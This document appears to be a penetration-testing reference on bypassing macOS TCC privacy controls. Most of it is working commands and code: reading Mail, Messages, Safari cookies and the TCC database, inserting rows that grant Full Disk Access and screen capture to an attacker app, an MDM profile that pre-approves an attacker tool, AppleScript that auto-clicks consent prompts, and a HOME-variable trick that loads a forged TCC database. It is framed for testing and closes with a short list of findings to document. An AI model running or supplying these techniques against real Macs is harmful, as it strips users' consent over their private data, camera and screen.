# TCC Bypass Techniques

Bypass macOS Transparency, Consent, and Control (TCC) to access protected resources without user consent.

**MITRE ATT&CK**: T1548 — Abuse Elevation Control Mechanism

## TCC Service Overview

| Service | Protects | TCC Key |
|---------|----------|---------|
| Full Disk Access | ~/Desktop, ~/Documents, ~/Downloads, Mail, Messages, Safari, Time Machine, system TCC.db | `kTCCServiceSystemPolicyAllFiles` |
| Accessibility | Synthetic clicks, keystrokes, UI scripting | `kTCCServiceAccessibility` |
| Screen Recording | Screen capture, window content | `kTCCServiceScreenCapture` |
| Camera | Camera access | `kTCCServiceCamera` |
| Microphone | Microphone access | `kTCCServiceMicrophone` |
| Automation | Control other apps via Apple Events | `kTCCServiceAppleEvents` |

---

## 1. Terminal TCC Inheritance

When Terminal.app (or iTerm2) has Full Disk Access, every child process inherits it.

```bash
# If Terminal has FDA, you can read protected files directly
cat ~/Library/Mail/V*/MailData/Accounts.plist
cat ~/Library/Messages/chat.db
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db "SELECT * FROM access;"

# Safari cookies and history
sqlite3 ~/Library/Cookies/Cookies.binarycookies "SELECT * FROM cookies;"
cat ~/Library/Safari/History.db
```

**Finding**: Any code execution in Terminal context = full TCC bypass if Terminal has FDA.

---

## 2. Finder Automation Bypass

If an app has Automation permission to control Finder, it inherits Finder's TCC grants.

```applescript
-- Finder can access Desktop/Documents without user TCC grants
tell application "Finder"
    set desktopFiles to every file of desktop
    repeat with f in desktopFiles
        set fileName to name of f
        -- Process each file
    end repeat
end tell
```

```bash
# Via osascript
osascript -e 'tell application "Finder" to get every file of folder "Desktop" of home'
osascript -e 'tell application "Finder" to duplicate file "secret.txt" of desktop to folder "Public" of home'
```

---

## 3. Direct TCC.db Modification (SIP Disabled)

When SIP is disabled, the TCC database can be written to directly.

```bash
# Check SIP status
csrutil status

# If disabled — grant FDA to an app
BUNDLE_ID="com.attacker.app"
TIMESTAMP=$(date +%s)

# User TCC.db
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
  "INSERT OR REPLACE INTO access (service, client, client_type, auth_value, auth_reason, auth_version, indirect_object_identifier, indirect_object_identifier_type, flags, last_modified) VALUES ('kTCCServiceSystemPolicyAllFiles', '$BUNDLE_ID', 0, 2, 4, 1, 'UNUSED', 0, 0, $TIMESTAMP);"

# System TCC.db (requires root)
sudo sqlite3 "/Library/Application Support/com.apple.TCC/TCC.db" \
  "INSERT OR REPLACE INTO access (service, client, client_type, auth_value, auth_reason, auth_version, indirect_object_identifier, indirect_object_identifier_type, flags, last_modified) VALUES ('kTCCServiceScreenCapture', '$BUNDLE_ID', 0, 2, 4, 1, 'UNUSED', 0, 0, $TIMESTAMP);"
```

---

## 4. MDM Profile TCC Grants

MDM profiles can pre-approve TCC access silently (no user prompt).

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadType</key>
            <string>com.apple.TCC.configuration-profile-policy</string>
            <key>Services</key>
            <dict>
                <key>SystemPolicyAllFiles</key>
                <array>
                    <dict>
                        <key>Identifier</key>
                        <string>com.attacker.tool</string>
                        <key>IdentifierType</key>
                        <string>bundleID</string>
                        <key>Allowed</key>
                        <true/>
                        <key>Authorization</key>
                        <string>AllowStandardUserToSetSystemService</string>
                    </dict>
                </array>
                <key>Accessibility</key>
                <array>
                    <dict>
                        <key>Identifier</key>
                        <string>com.attacker.tool</string>
                        <key>IdentifierType</key>
                        <string>bundleID</string>
                        <key>Allowed</key>
                        <true/>
                    </dict>
                </array>
            </dict>
        </dict>
    </array>
    <key>PayloadType</key>
    <string>Configuration</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
</dict>
</plist>
```

---

## 5. Plugin/Extension Injection into TCC-Entitled Processes

Inject code into a process that already has TCC grants.

```bash
# Find processes with TCC grants
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
  "SELECT client, service FROM access WHERE auth_value=2;" 2>/dev/null

# Safari extensions run in Safari's context (inherits Safari TCC)
# Electron apps loading plugins inherit the parent app's TCC
# Spotlight importers run with Spotlight's FDA
```

### Spotlight Importer Injection
```bash
# Spotlight has FDA by default. A malicious .mdimporter can read protected files.
# Place in: ~/Library/Spotlight/ or /Library/Spotlight/
# The importer is loaded by mds (metadata server) which has FDA
```

---

## 6. Synthetic Click Abuse (Accessibility)

Apps with Accessibility TCC can programmatically click "Allow" on TCC prompts.

```applescript
-- Requires Accessibility permission first
tell application "System Events"
    tell process "UserNotificationCenter"
        click button "Allow" of window 1
    end tell
end tell
```

---

## 7. CVE-Based Bypasses

| CVE | Year | Description | Target |
|-----|------|-------------|--------|
| CVE-2023-26818 | 2023 | Telegram FDA bypass — Telegram's TCC grant exploitable via dylib injection | FDA |
| CVE-2023-32364 | 2023 | Directory Utility bypass — could grant TCC without user consent | Multiple |
| CVE-2023-40424 | 2023 | App sandbox escape leading to TCC bypass | Multiple |
| CVE-2023-38571 | 2023 | Finder copy bypass accessing TCC-protected directories | FDA |
| CVE-2024-44133 | 2024 | Safari TCC bypass (HM Surf) — modify per-app browser settings in user profile | Camera/Mic/Location |
| CVE-2021-30713 | 2021 | XCSSET malware TCC bypass via Zoom or other apps with screen recording | Screen Recording |
| CVE-2020-9934 | 2020 | HOME environment variable manipulation to load custom TCC.db | All |

### CVE-2020-9934 — HOME Variable Manipulation
```bash
# Overwrite HOME so TCC reads an attacker-controlled database
export HOME=/tmp/fakehome
mkdir -p "/tmp/fakehome/Library/Application Support/com.apple.TCC/"
cp crafted_tcc.db "/tmp/fakehome/Library/Application Support/com.apple.TCC/TCC.db"
# Launch app — it reads the fake TCC.db with pre-approved grants
open /Applications/TargetApp.app
```
*Patched in macOS 11+, but check for regression on older systems.*

---

## 8. App Translocation Abuse

macOS App Translocation moves quarantined apps to a random path. This can interfere with TCC path-based checks.

```bash
# Force translocation by setting quarantine attribute
xattr -w com.apple.quarantine "0083;$(printf '%x' $(date +%s));Chrome;$(uuidgen)" /path/to/app.app

# App runs from /private/var/folders/... — TCC path checks may not match
```

---

## What to Document

- TCC bypass method used and macOS version tested
- Whether bypass requires pre-existing TCC grants (Accessibility, Automation)
- Impact: what protected data was accessed
- Whether SIP was enabled or disabled
- Remediation: OS update, MDM policy, remove unnecessary TCC grants
